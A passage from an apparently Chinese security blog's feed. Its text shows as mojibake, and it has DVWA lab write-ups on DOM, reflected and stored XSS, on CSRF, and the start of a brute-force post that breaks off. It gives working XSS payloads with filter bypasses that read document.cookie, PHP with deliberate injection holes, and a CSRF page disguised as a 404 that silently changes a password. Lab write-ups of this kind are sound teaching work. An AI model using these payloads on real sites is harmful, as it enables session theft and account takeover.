class="name">form</span>&gt;</span></span><br><span class="line">    &lt;/body</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">åç«¯<span class="number">1</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">      <span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);<span class="comment">//å»ºç«‹ä¸æ•°æ®åº“çš„è¿æ¥</span></span><br><span class="line">      <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;test&quot;</span>);<span class="comment">//é€‰æ‹©textæ•°æ®åº“</span></span><br><span class="line">      </span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;insert into xss value (<span class="subst">$id</span>,&#x27;<span class="subst">$name</span>&#x27;)&quot;</span>;</span><br><span class="line">      <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">ç”¨æˆ·æŸ¥çœ‹æ—¶çš„ä»£ç </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;select * from xss where id=1&quot;</span>;</span><br><span class="line">      <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å­å°±å¯¼è‡´æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œæ¯æ¬¡æœ‰ç”¨æˆ·è®¿é—®æ—¶å°±ä¼šè§¦å‘ã€‚</p><h1 id="DOMå‹æ¼æ´"><a href="#DOMå‹æ¼æ´" class="headerlink" title="DOMå‹æ¼æ´"></a>DOMå‹æ¼æ´</h1><img src="/2024/01/08/xss%E6%B3%A8%E5%85%A5/1.png" class="" title="Alt text"><p>åŸºäºDOMçš„XSSä¸€èˆ¬ä¸ä¼šä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œè¿™ä¸ªæ¼æ´æ˜¯ç”±äºå‰ç«¯çš„JSä»£ç ä¸ä¸¥è°¨é€ æˆçš„ï¼Œè¯»å–ã€æ‰§è¡Œæ¶æ„JSä»£ç åªç”±æµè§ˆå™¨å®Œæˆã€‚</p><h1 id="DVWA-DOM-Based-Cross-Site-Scripting"><a href="#DVWA-DOM-Based-Cross-Site-Scripting" class="headerlink" title="DVWA DOM Based Cross Site Scripting"></a>DVWA DOM Based Cross Site Scripting</h1><h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><p>æˆ‘ä»¬æ‰“å¼€æºç å‘ç°æ˜¯å…¨ç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰“å¼€f12æŸ¥çœ‹å‰ç«¯ä»£ç ï¼Œå‘ç°äº†å¦‚ä¸‹jsä»£ç <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)</span><br><span class="line"><span class="comment">//è¯¥å‡½æ•°ç”±document.location.hrefå’ŒindexOf()ç»„æˆï¼Œ</span></span><br><span class="line"><span class="comment">//documennt.location.hrefæ˜¯è·å–urlçš„å‡½æ•°ï¼ŒindexOf(&quot;default=&quot;)çš„æ„æ€æ˜¯è¿”å›default=åçš„å†…å®¹(åŒ…æ‹¬default=)</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>)<span class="comment">//è¿”å›urlçš„default=åçš„å†…å®¹ï¼Œ+8æ˜¯ä¸ºäº†è·³è¿‡default=</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);<span class="comment">//å°†æ‹¬å·å†…çš„å­—ç¬¦ä¸²è¾“å‡ºåˆ°webé¡µé¢ä¸Šè¿™æ—¶å€™å°±å­˜åœ¨DOMå‹çš„xssæ¼æ´</span></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬è¾“å…¥<code>?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>è¿™æ—¶ç”±äºLOWæ²¡æœ‰åšä»»ä½•è¿‡æ»¤å¯¼è‡´å±å¹•ä¼šç›´æ¥å¼¹å‡ºcookieå€¼ã€‚</p><h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><p>ç›¸æ¯”lowå¤šäº†ä¸ª<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span> (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">       <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">       <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨imgæ¥åˆ›é€ payloadï¼Œæ³¨æ„ç”±äºoptionæ— æ³•è¿›è¡Œè§£æimgã€‚æ‰€ä»¥æˆ‘ä»¬è¦é—­åˆselectå’Œoption<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=&lt;/option&gt;&lt;/select&gt;&lt;img%20src=x%20onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure></p><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>æˆ‘ä»¬æŸ¥çœ‹æºç å‘ç°å¤šäº†ä¸ªswitchè¯­å¥å¯¼è‡´å¦‚æœè¾“å…¥çš„ä¸ä¸ºæŒ‡å®šçš„è¯­è¨€å°±ä¼šåœæ­¢è¿è¡Œï¼Œè¿™æ—¶å€™æˆ‘ä»¬ç”±ä»¥ä¸‹å‡ ç§æ–¹æ³•ç»•è¿‡</p><h2 id="1-ä½¿ç”¨-æ¥è¿›è¡Œç»•è¿‡"><a href="#1-ä½¿ç”¨-æ¥è¿›è¡Œç»•è¿‡" class="headerlink" title="1.ä½¿ç”¨#æ¥è¿›è¡Œç»•è¿‡"></a>1.ä½¿ç”¨#æ¥è¿›è¡Œç»•è¿‡</h2><p>ç”±äºæµè§ˆå™¨ä¸ä¼šå°†url#ä¹‹åçš„å€¼ä¼ é€’ç»™åç«¯ï¼Œä½†æ˜¯ç”±äºDOMæ˜¯ç”±äºjsæ‰€å¼•èµ·çš„æ¼æ´ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ä½¿ç”¨#ç»•è¿‡<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English#&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h2 id="2-ä½¿ç”¨å¤šå˜é‡ä¼ å€¼ç»•è¿‡"><a href="#2-ä½¿ç”¨å¤šå˜é‡ä¼ å€¼ç»•è¿‡" class="headerlink" title="2.ä½¿ç”¨å¤šå˜é‡ä¼ å€¼ç»•è¿‡"></a>2.ä½¿ç”¨å¤šå˜é‡ä¼ å€¼ç»•è¿‡</h2><p>ç”±äºphpä»£ç åªåˆ¤æ–­defaultçš„å€¼ï¼Œä½†æ˜¯å‰ç«¯ä»£ç ä¼šå°†urlçš„default=ä¹‹åçš„æ‰€æœ‰å­—ç¬¦è¾“å‡ºåˆ°webä¸Šï¼Œæ‰€æœ‰æˆ‘ä»¬å¯ä»¥é‡‡ç”¨å¤šå˜é‡ç»•è¿‡<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default=English&amp;a=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h1 id="Reflected-Cross-Site-Scripting-XSS"><a href="#Reflected-Cross-Site-Scripting-XSS" class="headerlink" title="Reflected Cross Site Scripting (XSS)"></a>Reflected Cross Site Scripting (XSS)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»æºç æŸ¥çœ‹æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥åå°„æ€§xssæ²¡æœ‰ä»»ä½•è¿‡æ»¤æ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¾“å…¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;#</span><br></pre></td></tr></table></figure></p><h1 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h1><p>æˆ‘ä»¬æŸ¥çœ‹æºç <br>å¤šäº†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥å‘ç°è¿™æ˜¯ä½¿ç”¨str_replace()æ¥è¿›è¡Œè¿‡æ»¤æˆ‘ä»¬å¯ä»¥è¿›è¡Œä»¥ä¸‹ç»•è¿‡</p><h2 id="1-åŒå†™ç»•è¿‡"><a href="#1-åŒå†™ç»•è¿‡" class="headerlink" title="1.åŒå†™ç»•è¿‡"></a>1.åŒå†™ç»•è¿‡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;script&gt;ipt&gt;#</span><br></pre></td></tr></table></figure><h2 id="2-lt-img-gt-ç»•è¿‡"><a href="#2-lt-img-gt-ç»•è¿‡" class="headerlink" title="2.&lt;img&gt;ç»•è¿‡"></a>2.<code>&lt;img&gt;</code>ç»•è¿‡</h2><p>ä½¿ç”¨imgæ ‡ç­¾è¿›è¡Œç»•è¿‡<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%20src=x%20onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure></p><h2 id="3-å¤§å°å†™ç»•è¿‡"><a href="#3-å¤§å°å†™ç»•è¿‡" class="headerlink" title="3.å¤§å°å†™ç»•è¿‡"></a>3.å¤§å°å†™ç»•è¿‡</h2><p>ç”±äºstr_replaceä¸å¿½ç•¥å¤§å°å†™æ‰€ä»¥å¯ä»¥ä½¿ç”¨<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;sCript&gt;alert(document.cookie)&lt;/scRipt&gt;#</span><br></pre></td></tr></table></figure></p><h2 id="4-lt-iframe-onload-alert-document-cookie-gt"><a href="#4-lt-iframe-onload-alert-document-cookie-gt" class="headerlink" title="4.&lt;iframe onload=alert(document.cookie)&gt;"></a>4.<code>&lt;iframe onload=alert(document.cookie)&gt;</code></h2><h1 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h1><p>è¿‡æ»¤äº†scriptæ‰€ä»¥ä½¿ç”¨imgå’Œiframeå°±å¯ä»¥</p><h1 id="Stored-Cross-Site-Scripting-XSS"><a href="#Stored-Cross-Site-Scripting-XSS" class="headerlink" title="Stored Cross Site Scripting (XSS)"></a>Stored Cross Site Scripting (XSS)</h1><h2 id="LOW-1"><a href="#LOW-1" class="headerlink" title="LOW"></a>LOW</h2><p>æ²¡æœ‰è¿‡æ»¤æˆ‘ä»¬ç›´æ¥åœ¨ç•™è¨€æ¿å†™æ¶æ„ä»£ç å³å¯</p><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2>]]></content>
      
      
      <categories>
          
          <category> top10 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2024/01/05/CSRF/"/>
      <url>/2024/01/05/CSRF/</url>
      
        <content type="html"><![CDATA[<p>æ‰€è°“CSRFå°±æ˜¯ï¼ˆCross-site request forgeryï¼‰ï¼Œä¸­æ–‡åç§°ï¼šè·¨ç«™è¯·æ±‚ä¼ªé€ </p><h1 id="æ”»å‡»è¿‡ç¨‹"><a href="#æ”»å‡»è¿‡ç¨‹" class="headerlink" title="æ”»å‡»è¿‡ç¨‹"></a>æ”»å‡»è¿‡ç¨‹</h1><p>ç”¨æˆ·Aåœ¨æµè§ˆå™¨ç™»é™†äº†ç½‘ç«™Bï¼Œè¿™æ—¶å€™æœåŠ¡å™¨ä¼šå‘é€cookieç»™æµè§ˆå™¨ï¼Œè€Œè¿™æ—¶å¦‚æœç”¨æˆ·è®¿é—®äº†å±é™©ç½‘ç«™C,è¿™æ—¶Cä¼šå‘é€ä¸€ä¸ªè®¿é—®ç½‘é¡µBçš„è¯·æ±‚ï¼Œè€Œè¿™äº›è¯·æ±‚ä¸­å¾€å¾€ä¼šè¿›è¡Œä¸€äº›å±é™©æ“ä½œï¼Œå¦‚ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼Œç”šè‡³æ›´åŠ ä¸¥é‡ã€‚<br><img src="/2024/01/05/CSRF/1.jpg" class="" title="Alt text"></p><h1 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h1><p>å‡è®¾ä¸€ä¸ªè½¬å¸ç½‘ç«™å­˜å­CSRFæ¼æ´ï¼Œè¿™æ—¶å¼ ä¸‰è¦è¿›è¡Œè½¬è´¦ï¼Œè¿™æ—¶æ­£å¸¸è½¬è´¦çš„è¯·æ±‚å‡è®¾ä¸º<code>http://bank.example/withdraw?account=å¼ ä¸‰&amp;amount=1&amp;for=æå››</code>è¿™æ—¶æ­£å¸¸çš„å°†å¼ ä¸‰çš„1å…ƒè½¬ç»™äº†æå››ï¼Œä½†æ˜¯è¿™æ—¶å¦‚æœå¼ ä¸‰æ²¡æœ‰å°†è½¬è´¦ç½‘ç«™çš„è´¦å·ç™»å‡ºï¼Œå¹¶ä¸”è®¿é—®äº†é»‘å®¢åˆ¶ä½œçš„å±é™©ç½‘ç«™ï¼Œè¿™æ—¶å±é™©ç½‘ç«™å‘é€äº†ä¸€ä¸ªè¯·æ±‚ä¸º<code>http://bank.example/withdraw?account=å¼ ä¸‰&amp;amount=1000000&amp;for=é»‘å®¢</code>è¿™æ—¶é’±å°±è½¬åˆ°äº†é»‘å®¢æ‰‹é‡Œï¼Œè¿™ä¸»è¦çš„åŸå› æ˜¯è½¬è´¦ç½‘é¡µæœåŠ¡å™¨æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå¯¼è‡´å±é™©ç½‘ç«™å‘èµ·äº†ä¸€ä¸ªå±é™©è¯·æ±‚ä¸”æˆåŠŸè®¿é—®ï¼Œå¹¶ä¸”å¼ ä¸‰æ²¡æœ‰ç™»å‡ºå¯¼è‡´äº†æµè§ˆå™¨å­˜å‚¨ç€è´¦å·çš„cookieï¼Œè¿™æ—¶å±é™©ç½‘ç«™å‘èµ·çš„è¯·æ±‚å°±æºå¸¦äº†cookieè¢«è½¬è´¦ç½‘ç«™è¯¯ä»¥ä¸ºæ˜¯ç”¨æˆ·ã€‚</p><h1 id="DVMA-CSRF"><a href="#DVMA-CSRF" class="headerlink" title="DVMA-CSRF"></a>DVMA-CSRF</h1><h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><p>è¿™ä¸ªLOWéš¾åº¦æˆ‘ä»¬æŸ¥çœ‹æºç å¯ä»¥å‘ç°åªæœ‰ä¸¤æ¬¡ç§˜å¯†ç›¸åŒå°±å¯ä»¥æˆåŠŸä¿®æ”¹å¯†ç æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤å¹¶ä¸”å…¶å¯†ç æ˜¯ä½¿ç”¨GETä¼ å€¼ï¼Œæˆ‘ä»¬å°è¯•ä¿®æ”¹ä¸€ä¸‹å¯†ç ï¼Œå¾—åˆ°urlä¸º<code>http://192.168.32.1/DVWA-master/vulnerabilities/csrf/?password_new=2&amp;password_conf=2&amp;Change=Change#</code>è¿™æ—¶å€™æˆ‘ä»¬å°†å…¶è¿›è¡Œä¿®æ”¹<code>http://192.168.32.1/DVWA-master/vulnerabilities/csrf/?password_new=3333&amp;password_conf=3333&amp;Change=Change#</code>ä¹‹åå†å…¶ä»–ç½‘é¡µè®¿é—®å‘ç°ï¼ŒæˆåŠŸå°†å¯†ç ä¿®æ”¹ä¸ºäº†3333ä½†æ˜¯è¿™ç§æ–¹æ³•å±å®æ˜¯æœ‰ç‚¹å‚»ï¼Œè¿™æ—¶å€™æˆ‘ä»¬æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³•è¿›è¡Œä¿®æ”¹</p><h2 id="1ã€‚çŸ­é“¾"><a href="#1ã€‚çŸ­é“¾" class="headerlink" title="1ã€‚çŸ­é“¾"></a>1ã€‚çŸ­é“¾</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨çŸ­é“¾ç”Ÿæˆå·¥å…·çš„åœ¨çº¿ç½‘ç«™å°†è¯¥é“¾æ¥è¿›è¡Œè½¬æ¢ã€‚</p><h2 id="2ï¼š"><a href="#2ï¼š" class="headerlink" title="2ï¼š"></a>2ï¼š</h2><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹htmlæ–‡ä»¶å°†htmlæ–‡ä»¶æ”¾åœ¨webé‡Œï¼Œè¿™æ—¶å€™ç½‘é¡µä¼šè‡ªåŠ¨å‘é€è¯·æ±‚ã€‚è¯¥æ–¹æ³•æ›´åŠ éšè”½ä¹Ÿå¸¸ç”¨ä»£ç å¦‚ä¸‹<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.32.1/DVWA-master/vulnerabilities/csrf/?password_new=3333&amp;password_conf=3333&amp;Change=Change#&quot;</span><span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">    404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">           file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>è¿™æ—¶å€™æˆ‘ä»¬è®¿é—®è¯¥ç½‘ç«™ä¼šæ˜¾ç¤º404è¿™å›ä½¿ç”¨æˆ·è¯¯è®¤ä¸ºè®¿é—®é”™è¯¯äº†ï¼Œä½†æ˜¯å…¶å®å¯†ç å·²ç»è¢«ä¿®æ”¹äº†ã€‚<br><img src="/2024/01/05/CSRF/2.png" class="" title="Alt text"></p><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><img src="/2024/01/05/CSRF/3.png" class="" title="Alt text"><p>æˆ‘ä»¬æŸ¥çœ‹ä»£ç å‘ç°æ¯”LOWå¤šäº†ä¸ª<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> )</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªä»£ç çš„ä½œç”¨ä½¿åŒ¹é…æˆ‘ä»¬å‘é€çš„refererå¤´æŸ¥çœ‹æ˜¯å¦ä¸ºæœåŠ¡å™¨åç§°ï¼Œå¦‚æœrefereré‡Œå«æœ‰æœåŠ¡å™¨åç§°åˆ™ä¿®æ”¹å¯†ç ã€‚<br>è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†htmlæ–‡ä»¶æ”¹ä¸ºä¸»æœºåç§°ã€‚è¿™æ ·å­å†å‘é€æ—¶refererå¤´å°±å›åŒ…å«ä¸»æœºåç§°</p><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><p>highéš¾åº¦çš„å› ä¸ºå…¶éœ€è¦è¿ç”¨åˆ°xssçš„å†…å®¹å†å­¦ä¹ ç½‘xssåå†è¡¥å……ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> top10 </category>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWAçš„wp</title>
      <link href="/2024/01/01/DVWA%E7%9A%84wp/"/>
      <url>/2024/01/01/DVWA%E7%9A%84wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Burte-Force"><a href="#Burte-Force" class="headerlink" title="Burte Force"></a>Burte Force</h1><p>è¿™ä¸€å…³è€ƒå¯Ÿæˆ‘ä»¬æ˜¯çˆ†ç ´ã€‚</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><img src="/2024/01/01/DVWA%E7%9A%84wp/1-1.png" class="" title="Alt text"><p>è¿™ä¸€ä¸²ä»£ç å¯¹ä¸åˆ·è¿‡sqli-labsçš„æ¥è¯´åº”è¯¥æ˜¯æ¯”è¾ƒç†Ÿæ‚‰çš„ã€‚<br>æˆ‘ä»¬å®¡æŸ¥ä»£ç å¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ä¸ªä»£ç æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„usernameåšä»»ä½•è¿‡æ»¤ï¼Œåªå°†passwordç¼–ç ä¸ºmd5ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æœ‰ä¸¤ç§è§£æ³•ï¼Œä¸€ä¸ªæ˜¯ä½¿ç”¨sqlæ³¨å…¥ç›´æ¥ä½¿ç”¨ä¸‡èƒ½å¯†ç ï¼Œç¬¬äºŒä¸ªæ˜¯ä½¿ç”¨bpæ¥çˆ†ç ´äº†ã€‚</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>è¿™å…³æˆ‘ä»¬æŸ¥çœ‹æºç <br><img src="/2024/01/01/DVWA%E7%9A%84wp/1-2.png" class="" title="Alt text"><br><code>mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user )</code><br>æˆ‘ä»¬å‘ç°å¤šäº†è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯¹äºåˆ·è¿‡sqlilabsçš„æˆ‘ä»¬æ¥è¯´åº”è¯¥ä¸é™Œç”Ÿï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯ç»™å­—ç¬¦ä¸²é‡Œå­˜åœ¨çš„ç‰¹æ®Šå­—ç¬¦å‰åŠ ä¸€ä¸ª\å¯¹å­—ç¬¦è¿›è¡Œè½¬ä¹‰ä»¥æ­¤æ¥é˜²æ­¢æ³¨å…¥ã€‚å¦‚æœè¯¥æ•°æ®åº“çš„å­—ç¬¦é›†ä¸ºgbkç¼–ç 